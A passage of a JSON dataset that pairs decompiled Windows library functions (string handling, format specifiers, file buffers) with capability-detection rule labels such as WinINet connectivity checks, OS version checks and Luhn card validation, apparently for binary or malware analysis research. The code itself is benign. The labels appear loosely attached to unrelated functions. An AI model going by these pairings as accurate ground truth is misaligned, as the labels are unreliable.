        "decompiled_code": "\nvoid __thiscall fcn.0048ca60(int32_t *param_1, int32_t param_2, int32_t param_3, int32_t param_4)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uchar auStack29 [13];\n    \n    iVar9 = *param_1;\n    uVar8 = *(iVar9 + -8);\n    uVar6 = (param_4 - param_3) + *(iVar9 + -0xc);\n    iVar5 = param_2 + param_3;\n    iVar7 = *(iVar9 + -0xc) - iVar5;\n    if (uVar6 <= uVar8) {\n        if (*(iVar9 + -4) < 1) {\n            iVar9 = *param_1;\n            if ((iVar7 != 0) && (param_4 != param_3)) {\n                puVar4 = iVar9 + param_4 + param_2;\n                if (iVar7 == 1) {\n                    *puVar4 = *(iVar5 + iVar9);\n                    iVar9 = *param_1;\n                }\n                else {\n                    sub.msvcrt.dll_memmove(puVar4, iVar5 + iVar9, iVar7);\n                    iVar9 = *param_1;\n                }\n            }\n            goto code_r0x0048cb21;\n        }\n        uVar8 = *(*param_1 + -8);\n    }\n    iVar2 = fcn.0048b7a0(uVar6, uVar8, auStack29);\n    if (param_2 != 0) {\n        if (param_2 == 1) {\n            *(iVar2 + 0xc) = **param_1;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(iVar2 + 0xc, *param_1, param_2);\n        }\n    }\n    iVar9 = iVar2 + 0xc;\n    iVar3 = *param_1;\n    if (iVar7 != 0) {\n        puVar4 = iVar2 + param_2 + 0xc + param_4;\n        if (iVar7 == 1) {\n            *puVar4 = *(iVar3 + iVar5);\n            iVar3 = *param_1;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar4, iVar3 + iVar5, iVar7);\n            iVar3 = *param_1;\n        }\n    }\n    if (*0x515a34 == 0) {\n        iVar5 = *(iVar3 + -4);\n        *(iVar3 + -4) = iVar5 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iVar3 + -4;\n        iVar5 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar5 < 1) {\n        fcn.004c2c30(iVar3 + -0xc);\n    }\n    *param_1 = iVar9;\ncode_r0x0048cb21:\n    *(iVar9 + -4) = 0;\n    *(iVar9 + -0xc) = uVar6;\n    *(iVar9 + uVar6) = 0;\n    return;\n}\n",
        "token_count": 750
    },
    "0048d660": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048d660(int32_t param_1, uchar *param_2, char param_3)\n\n{\n    ushort *puVar1;\n    uint32_t uVar2;\n    ushort *puVar3;\n    ushort *puVar4;\n    uint32_t uVar5;\n    \n    uVar2 = *(param_1 + 0xc);\n    puVar4 = param_2 + 1;\n    *param_2 = 0x25;\n    if ((uVar2 & 0x800) != 0) {\n        param_2[1] = 0x2b;\n        puVar4 = param_2 + 2;\n    }\n    if ((uVar2 & 0x400) != 0) {\n        *puVar4 = 0x23;\n        puVar4 = puVar4 + 1;\n    }\n    uVar5 = uVar2 & 0x104;\n    if (uVar5 == 0x104) {\n        puVar3 = puVar4;\n        if (param_3 == '\\0') goto code_r0x0048d728;\ncode_r0x0048d6f8:\n        *puVar3 = param_3;\n        puVar1 = puVar3 + 1;\n        puVar4 = puVar3 + 1;\n    }\n    else {\n        *puVar4 = 0x2a2e;\n        puVar3 = puVar4 + 1;\n        if (param_3 != '\\0') goto code_r0x0048d6f8;\n        puVar1 = puVar4 + 3;\n        puVar4 = puVar4 + 1;\n    }\n    if (uVar5 == 4) {\n        *puVar4 = 0x66;\n        *puVar1 = 0;\n        return;\n    }\n    if (uVar5 == 0x100) {\n        *puVar4 = (-((uVar2 & 0x4000) == 0) & 0x20U) + 0x45;\n        *puVar1 = 0;\n        return;\n    }\n    if (uVar5 != 0x104) {\n        *puVar4 = (-((uVar2 & 0x4000) == 0) & 0x20U) + 0x47;\n        *puVar1 = 0;\n        return;\n    }\ncode_r0x0048d728:\n    *puVar4 = (-((uVar2 & 0x4000) == 0) & 0x20U) + 0x41;\n    *(puVar4 + 1) = 0;\n    return;\n}\n",
        "token_count": 591
    },
    "0048f5c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0048f5c0(uint s1, uint arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    \n    if (arg_10h == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = sub.msvcrt.dll_memcmp(s1, arg_ch, arg_10h);\n    }\n    return uVar1;\n}\n",
        "token_count": 94
    },
    "00490300": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00490300(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    if (*param_1 == 0) {\n        return NULL;\n    }\n    if (*(param_1 + 1) != '\\0') {\n        iVar1 = sub.msvcrt.dll_fclose(*param_1);\n        *param_1 = 0;\n        if (iVar1 != 0) {\n            param_1 = NULL;\n        }\n        return param_1;\n    }\n    *param_1 = 0;\n    return param_1;\n}\n",
        "token_count": 130
    },
    "00496350": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00496350(int32_t param_1, int32_t param_2, uint32_t param_3)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    int32_t extraout_EDX;\n    uint *puVar5;\n    int32_t iStack36;\n    uint auStack32 [4];\n    \n    if (*(param_1 + 0x58) == NULL) goto code_r0x004964af;\n    cVar1 = (**(**(param_1 + 0x58) + 0x18))();\n    if (cVar1 == '\\0') {\n        (**(**(param_1 + 0x58) + 0x20))();\n        fcn.00437ed0();\n        puVar5 = auStack32;\n        uVar2 = (**(**(param_1 + 0x58) + 8))\n                          (param_1 + 0x38, param_2, param_2 + param_3, puVar5, auStack32, extraout_EDX + auStack32, \n                           &iStack36);\n        if (uVar2 < 2) {\n            param_3 = iStack36 - auStack32;\n            iVar4 = iStack36;\n            uVar3 = fcn.004903a0(auStack32, param_3);\n            if ((param_3 != uVar3) || ((uVar2 & 1) == 0)) goto code_r0x004963fe;\n            iVar4 = (**(**(param_1 + 0x58) + 8))\n                              (puVar5, auStack32[0], *(param_1 + 0x14), auStack32, auStack32, iVar4, &iStack36);\n            if (iVar4 != 2) {\n                uVar3 = iStack36 - auStack32;\n                uVar2 = fcn.004903a0(auStack32, uVar3);\n                return uVar2 & 0xffffff00 | uVar2 == uVar3;\n            }\n        }\n        else if (uVar2 == 3) goto code_r0x004963e9;\n        fcn.004bdff0(\"basic_filebuf::_M_convert_to_external conversion error\");\ncode_r0x004964af:\n        fcn.004bde60();\n        if (*(extraout_ECX + 0x48) != '\\0') {\n            if (*(extraout_ECX + 0x40) != 0) {\n                fcn.004c2c20(*(extraout_ECX + 0x40));\n            }\n            *(extraout_ECX + 0x40) = 0;\n            *(extraout_ECX + 0x48) = 0;\n        }\n        uVar2 = *(extraout_ECX + 0x5c);\n        if (uVar2 != 0) {\n            uVar2 = fcn.004c2c20(uVar2);\n        }\n        *(extraout_ECX + 0x5c) = 0;\n        *(extraout_ECX + 0x60) = 0;\n        *(extraout_ECX + 100) = 0;\n        *(extraout_ECX + 0x68) = 0;\n        return uVar2;\n    }\ncode_r0x004963e9:\n    uVar3 = fcn.004903a0(param_2, param_3);\ncode_r0x004963fe:\n    return uVar3 & 0xffffff00 | uVar3 == param_3;\n}\n",
        "token_count": 807
    },
    "004964c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004964c0(int32_t param_1)\n\n{\n    if (*(param_1 + 0x48) != '\\0') {\n        if (*(param_1 + 0x40) != 0) {\n            fcn.004c2c20(*(param_1 + 0x40));\n        }\n        *(param_1 + 0x40) = 0;\n        *(param_1 + 0x48) = 0;\n    }\n    if (*(param_1 + 0x5c) != 0) {\n        fcn.004c2c20(*(param_1 + 0x5c));\n    }\n    *(param_1 + 0x5c) = 0;\n    *(param_1 + 0x60) = 0;\n    *(param_1 + 100) = 0;\n    *(param_1 + 0x68) = 0;\n    return;\n}\n",
        "token_count": 209
    },
    "00496520": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00496520(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if ((*(param_1 + 0x48) == '\\0') && (*(param_1 + 0x40) == 0)) {\n        uVar1 = fcn.004c2c50(*(param_1 + 0x44));\n        *(param_1 + 0x48) = 1;\n        *(param_1 + 0x40) = uVar1;\n        return;\n    }\n    return;\n}\n",
        "token_count": 121
    },
    "00496550": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00496550(int32_t *param_1, uint param_2, uint32_t param_3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    cVar1 = fcn.0044e030();\n    if (cVar1 == '\\0') {\n        fcn.00490280(param_2, param_3, 0x1b4);\n        cVar1 = fcn.0044e030();\n        if (cVar1 != '\\0') {\n            iVar2 = param_1[0x10];\n            if ((*(param_1 + 0x12) == '\\0') && (iVar2 == 0)) {\n                iVar2 = fcn.004c2c50(param_1[0x11]);\n                *(param_1 + 0x12) = 1;\n                param_1[0x10] = iVar2;\n            }\n            param_1[1] = iVar2;\n            param_1[2] = iVar2;\n            param_1[3] = iVar2;\n            param_1[0xc] = param_3;\n            *(param_1 + 0x49) = 0;\n            param_1[5] = 0;\n            param_1[4] = 0;\n            param_1[6] = 0;\n            param_1[0xe] = param_1[0xd];\n            param_1[0xf] = param_1[0xd];\n            if ((param_3 & 2) != 0) {\n                uVar3 = 2;\n                (**(*param_1 + 0x10))(param_1, 0, 0);\n                if ((param_3 & uVar3) == 0xffffffff) {\n                    fcn.00496840();\n                    return NULL;\n                }\n            }\n            return param_1;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 434
    },
    "004982e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.004982e0(int32_t param_1, int32_t param_2, uint32_t param_3)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    int32_t extraout_EDX;\n    uint *puVar5;\n    int32_t iStack36;\n    uint auStack32 [4];\n    \n    if (*(param_1 + 0x5c) == NULL) goto code_r0x0049843f;\n    cVar1 = (**(**(param_1 + 0x5c) + 0x18))();\n    if (cVar1 == '\\0') {\n        (**(**(param_1 + 0x5c) + 0x20))();\n        fcn.00437ed0();\n        puVar5 = auStack32;\n        uVar2 = (**(**(param_1 + 0x5c) + 8))\n                          (param_1 + 0x38, param_2, param_2 + param_3 * 2, puVar5, auStack32, extraout_EDX + auStack32, \n                           &iStack36);\n        if (uVar2 < 2) {\n            param_3 = iStack36 - auStack32;\n            iVar4 = iStack36;\n            uVar3 = fcn.004903a0(auStack32, param_3);\n            if ((param_3 != uVar3) || ((uVar2 & 1) == 0)) goto code_r0x0049838c;\n            iVar4 = (**(**(param_1 + 0x5c) + 8))\n                              (puVar5, auStack32[0], *(param_1 + 0x14), auStack32, auStack32, iVar4, &iStack36);\n            if (iVar4 != 2) {\n                uVar3 = iStack36 - auStack32;\n                uVar2 = fcn.004903a0(auStack32, uVar3);\n                return uVar2 & 0xffffff00 | uVar2 == uVar3;\n            }\n        }\n        else if (uVar2 == 3) goto code_r0x00498377;\n        fcn.004bdff0(\"basic_filebuf::_M_convert_to_external conversion error\");\ncode_r0x0049843f:\n        fcn.004bde60();\n        if (*(extraout_ECX + 0x48) != '\\0') {\n            if (*(extraout_ECX + 0x40) != 0) {\n                fcn.004c2c20(*(extraout_ECX + 0x40));\n            }\n            *(extraout_ECX + 0x40) = 0;\n            *(extraout_ECX + 0x48) = 0;\n        }\n        uVar2 = *(extraout_ECX + 0x60);\n        if (uVar2 != 0) {\n            uVar2 = fcn.004c2c20(uVar2);\n        }\n        *(extraout_ECX + 0x60) = 0;\n        *(extraout_ECX + 100) = 0;\n        *(extraout_ECX + 0x68) = 0;\n        *(extraout_ECX + 0x6c) = 0;\n        return uVar2;\n    }\ncode_r0x00498377:\n    uVar3 = fcn.004903a0(param_2, param_3);\ncode_r0x0049838c:\n    return uVar3 & 0xffffff00 | uVar3 == param_3;\n}\n",
        "token_count": 817
    },
    "00498450": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00498450(int32_t param_1)\n\n{\n    if (*(param_1 + 0x48) != '\\0') {\n        if (*(param_1 + 0x40) != 0) {\n            fcn.004c2c20(*(param_1 + 0x40));\n        }\n        *(param_1 + 0x40) = 0;\n        *(param_1 + 0x48) = 0;\n    }\n    if (*(param_1 + 0x60) != 0) {\n        fcn.004c2c20(*(param_1 + 0x60));\n    }\n    *(param_1 + 0x60) = 0;\n    *(param_1 + 100) = 0;\n    *(param_1 + 0x68) = 0;\n    *(param_1 + 0x6c) = 0;\n    return;\n}\n",
        "token_count": 206
    },
    "004984b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.004984b0(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint extraout_ECX;\n    int32_t unaff_EBX;\n    int32_t unaff_EBP;\n    char unaff_DI;\n    ulong uVar5;\n    int32_t in_stack_00000024;\n    \n    if ((*(param_1 + 0x48) != '\\0') || (in_EAX = *(param_1 + 0x40),  in_EAX != 0)) {\n        return in_EAX;\n    }\n    if (*(param_1 + 0x44) < 0x3fffffff) {\n        iVar1 = fcn.004c2c50(*(param_1 + 0x44) * 2);\n        *(param_1 + 0x48) = 1;\n        *(param_1 + 0x40) = iVar1;\n        return iVar1;\n    }\n    fcn.004c33a0();\n    fcn.004c3080();\n    fcn.0043a8e0();\n    fcn.004c3080();\n    fcn.0043a8e0();\n    fcn.004c3080();\n    fcn.0043a8e0();\n    fcn.004c3080();\n    fcn.0043a8e0();\n    fcn.004c3080();\n    fcn.0043a8e0();\n    fcn.004c3080();\n    fcn.0043a8e0();\n    fcn.004c3080();\n    fcn.0043a8e0();\n    fcn.004c3080();\n    fcn.0043a8e0();\n    fcn.004c3080();\n    fcn.0043a8e0();\n    fcn.004c3080();\n    fcn.0043a8e0();\n    uVar5 = fcn.004c33a0();\n    if (uVar5 >> 0x20 != 1) {\n        fcn.0043a8e0(uVar5);\n    }\n    fcn.004c2e40();\n    fcn.004c2fb0();\n    uVar2 = *(unaff_EBX + 0x14) | 1;\n    *(unaff_EBX + 0x14) = uVar2;\n    if ((*(unaff_EBX + 0x10) & uVar2) == 0) {\n        if (unaff_DI == '\\0') {\n            *(unaff_EBX + 0x1c) = 0;\n        }\n        else {\n            *(unaff_EBX + 0x20) = 0;\n        }\n        return unaff_EBX + 0x1c;\n    }\n    iVar3 = fcn.004bdff0(\"ios_base::_M_grow_words allocation failed\");\n    iVar1 = *(unaff_EBX + 0x68);\n    uVar4 = extraout_ECX;\n    if ((iVar1 != unaff_EBP) && (iVar1 != 0)) {\n        fcn.004c2c20(iVar1);\n    }\n    *(unaff_EBX + 0x68) = iVar3;\n    *(unaff_EBX + 100) = uVar4;\n    return iVar3 + in_stack_00000024 * 8;\n}\n",
        "token_count": 772
    },
    "00498500": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00498500(int32_t *param_1, uint param_2, uint32_t param_3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    cVar1 = fcn.0044e030();\n    if (cVar1 == '\\0') {\n        fcn.00490280(param_2, param_3, 0x1b4);\n        cVar1 = fcn.0044e030();\n        if (cVar1 != '\\0') {\n            iVar2 = param_1[0x10];\n            if ((*(param_1 + 0x12) == '\\0') && (iVar2 == 0)) {\n                fcn.004984d0();\n                iVar2 = param_1[0x10];\n            }\n            param_1[1] = iVar2;\n            param_1[2] = iVar2;\n            param_1[3] = iVar2;\n            param_1[0xc] = param_3;\n            *(param_1 + 0x49) = 0;\n            param_1[5] = 0;\n            param_1[4] = 0;\n            param_1[6] = 0;\n            param_1[0xe] = param_1[0xd];\n            param_1[0xf] = param_1[0xd];\n            if ((param_3 & 2) != 0) {\n                uVar3 = 2;\n                (**(*param_1 + 0x10))(param_1, 0, 0);\n                if ((param_3 & uVar3) == 0xffffffff) {\n                    fcn.004987e0();\n                    return NULL;\n                }\n            }\n            return param_1;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 408
    },
    "0049d530": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0049d530(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    uint *in_ECX;\n    uint var_19h;\n    uint var_14h;\n    uint var_bp_10h;\n    uint var_8h;\n    \n    *in_ECX = 0xffffffff;\n    in_ECX[1] = 0xffffffff;\n    in_ECX[2] = 0;\n    fcn.0049dc90(arg_8h, 1);\n    if ((var_19h != '\\0') && ((*(arg_8h + *(*arg_8h + -0xc) + 0x14) & 5) == 0)) {\n        piVar1 = *(arg_8h + *(*arg_8h + -0xc) + 0x78);\n        (**(*piVar1 + 0x10))(piVar1, 0, 0, 1, 8);\n        *in_ECX = stack0xffffffe4;\n        in_ECX[1] = var_14h;\n        in_ECX[2] = var_bp_10h;\n    }\n    return;\n}\n",
        "token_count": 286
    },
    "004ad130": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004ad130(int32_t param_1, int32_t *param_2, int32_t param_3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t **ppiVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    ulong uVar7;\n    \n    if ((*0x515c00 == '\\0') && (iVar2 = fcn.004c3130(0x515c00),  iVar2 != 0)) {\n        if (*0x515a34 != 0) {\n            fcn.00438280(0x5174f4);\n        }\n        fcn.004c3210(0x515c00);\n        fcn.004014c0(0x4c3b00);\n    }\n    iVar2 = *0x527c60;\n    if ((*0x515a34 != 0) && (iVar6 = fcn.004382e0(0x5174f4),  iVar2 = *0x527c60,  iVar6 != 0)) {\n        puVar3 = fcn.004c2d80(4);\n        *puVar3 = 0x52b508;\n        fcn.004c3330(puVar3, 0x528188, 0x449ae0);\n        goto code_r0x004ad2a0;\n    }\n    while (iVar2 != 0) {\n        iVar2 = fcn.00451af0();\n        if (iVar2 == param_3) {\n            iVar6 = fcn.00451af0();\n            iVar2 = param_3;\n            goto code_r0x004ad1a9;\n        }\n        uVar7 = fcn.00451af0();\n        if (uVar7 == param_3) goto code_r0x004ad2e0;\n        iVar2 = *((uVar7 >> 0x20) + 8);\n    }\n    iVar5 = *(param_1 + 0xc);\n    param_3 = param_3 * 4;\n    iVar6 = -1;\n    ppiVar4 = iVar5 + param_3;\n    if (*ppiVar4 != NULL) goto code_r0x004ad1b8;\n    while (piVar1 = param_2 + 1,  *0x515a34 != 0) {\n        LOCK();\n        *piVar1 = *piVar1 + 1;\n        iVar2 = *0x515a34;\n        iVar5 = *(param_1 + 0xc);\n        *(iVar5 + param_3) = param_2;\n        if (iVar6 != -1) {\n            if (iVar2 == 0) goto code_r0x004ad20f;\n            LOCK();\n            *piVar1 = *piVar1 + 1;\n            iVar2 = *0x515a34;\n            *(*(param_1 + 0xc) + iVar6 * 4) = param_2;\n        }\n        while( true ) {\n            if (iVar2 == 0) {\n                return;\n            }\ncode_r0x004ad2a0:\n            iVar2 = fcn.00438340(0x5174f4);\n            if (iVar2 == 0) {\n                return;\n            }\n            puVar3 = fcn.004c2d80(4);\n            *puVar3 = 0x52b51c;\n            fcn.004c3330(puVar3, 0x528194, 0x449b10);\ncode_r0x004ad2e0:\n            iVar2 = fcn.00451af0();\n            iVar6 = param_3;\ncode_r0x004ad1a9:\n            iVar5 = *(param_1 + 0xc);\n            param_3 = iVar2 * 4;\n            ppiVar4 = iVar5 + param_3;\n            if (*ppiVar4 == NULL) break;\ncode_r0x004ad1b8:\n            iVar2 = *0x515a34;\n            if (param_2 != NULL) {\n                (**(*param_2 + 4))();\n                iVar2 = *0x515a34;\n            }\n        }\n    }\n    param_2[1] = param_2[1] + 1;\n    *ppiVar4 = param_2;\n    if (iVar6 == -1) {\n        return;\n    }\ncode_r0x004ad20f:\n    param_2[1] = param_2[1] + 1;\n    *(iVar5 + iVar6 * 4) = param_2;\n    return;\n}\n",
        "token_count": 1028
    },
    "004aed00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004aed00(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = *param_1;\n    if (*0x515a34 == 0) {\n        iVar2 = *piVar1;\n        *piVar1 = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 != 1) {\n        return;\n    }\n    fcn.004ae810();\n    fcn.004c2c30(piVar1);\n    return;\n}\n",
        "token_count": 153
    },
    "004aed50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004aed50(int32_t **param_1, int32_t **param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = *param_2;\n    if (*0x515a34 == 0) {\n        *piVar1 = *piVar1 + 1;\n        piVar1 = *param_1;\n    }\n    else {\n        LOCK();\n        *piVar1 = *piVar1 + 1;\n        piVar1 = *param_1;\n    }\n    if (*0x515a34 == 0) {\n        iVar2 = *piVar1;\n        *piVar1 = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 != 1) {\n        *param_1 = *param_2;\n        return;\n    }\n    fcn.004ae810();\n    fcn.004c2c30(piVar1);\n    *param_1 = *param_2;\n    return;\n}\n",
        "token_count": 255
    },
    "004afdd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t ** __thiscall\nfcn.004afdd0(int32_t **param_1, int32_t param_2, uint32_t param_3, int32_t **param_4, uint32_t param_5)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    bool bVar9;\n    bool bVar10;\n    int32_t in_stack_ffffffb8;\n    int32_t in_stack_ffffffbc;\n    \n    piVar1 = param_1[1];\n    if ((param_3 + 0x7fffffff) - piVar1 < param_5) {\n        fcn.004be310(0x52465c);\n        return in_stack_ffffffb8 - in_stack_ffffffbc;\n    }\n    ppiVar2 = *param_1;\n    piVar8 = (param_5 - param_3) + piVar1;\n    if (ppiVar2 == param_1 + 2) {\n        piVar5 = 0xf;\n    }\n    else {\n        piVar5 = param_1[2];\n    }\n    if (piVar5 < piVar8) {\n        fcn.004b1f10(param_2, param_3, param_4, param_5);\n        goto code_r0x004afea0;\n    }\n    puVar4 = ppiVar2 + param_2;\n    iVar6 = piVar1 - (param_2 + param_3);\n    bVar9 = iVar6 != 0;\n    bVar10 = param_3 != param_5;\n    if ((param_4 < ppiVar2) || (piVar1 + ppiVar2 < param_4)) {\n        if (bVar10 && bVar9) {\n            if (iVar6 == 1) {\n                puVar4[param_5] = puVar4[param_3];\n            }\n            else {\n                sub.msvcrt.dll_memmove(puVar4 + param_5, puVar4 + param_3, iVar6);\n            }\n        }\n        if (param_5 == 0) goto code_r0x004afea0;\n        if (param_5 != 1) {\n            sub.msvcrt.dll_memcpy(puVar4, param_4, param_5);\n            goto code_r0x004afea0;\n        }\n    }\n    else {\n        if ((param_5 == 0) || (param_3 < param_5)) {\ncode_r0x004affed:\n            if (bVar10 && bVar9) goto code_r0x004aff00;\n        }\n        else {\n            if (param_5 == 1) {\n                *puVar4 = *param_4;\n                goto code_r0x004affed;\n            }\n            sub.msvcrt.dll_memmove(puVar4, param_4, param_5);\n            if (!bVar10 || !bVar9) goto code_r0x004afea0;\ncode_r0x004aff00:\n            if (iVar6 == 1) {\n                puVar4[param_5] = puVar4[param_3];\n            }\n            else {\n                sub.msvcrt.dll_memmove(puVar4 + param_5, puVar4 + param_3, iVar6);\n            }\n        }\n        if (param_5 <= param_3) goto code_r0x004afea0;\n        ppiVar2 = puVar4 + param_3;\n        if (ppiVar2 < param_4 + param_5) {\n            if (param_4 < ppiVar2) {\n                iVar6 = ppiVar2 - param_4;\n                if (iVar6 == 1) {\n                    *puVar4 = *param_4;\n                }\n                else if (iVar6 != 0) {\n                    sub.msvcrt.dll_memmove(puVar4, param_4, iVar6);\n                }\n                iVar7 = param_5 - iVar6;\n                if (iVar7 == 1) {\n                    puVar4[iVar6] = puVar4[param_5];\n                }\n                else if (iVar7 != 0) {\n                    sub.msvcrt.dll_memcpy(puVar4 + iVar6, puVar4 + param_5, iVar7);\n                }\n            }\n            else {\n                puVar3 = (param_5 - param_3) + param_4;\n                if (param_5 == 1) {\n                    *puVar4 = *puVar3;\n                }\n                else {\n                    sub.msvcrt.dll_memcpy(puVar4, puVar3, param_5);\n                }\n            }\n            goto code_r0x004afea0;\n        }\n        if (param_5 != 1) {\n            sub.msvcrt.dll_memmove(puVar4, param_4, param_5);\n            goto code_r0x004afea0;\n        }\n    }\n    *puVar4 = *param_4;\ncode_r0x004afea0:\n    param_1[1] = piVar8;\n    *(*param_1 + piVar8) = 0;\n    return param_1;\n}\n",
        "token_count": 1165
    },
    "004b0120": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
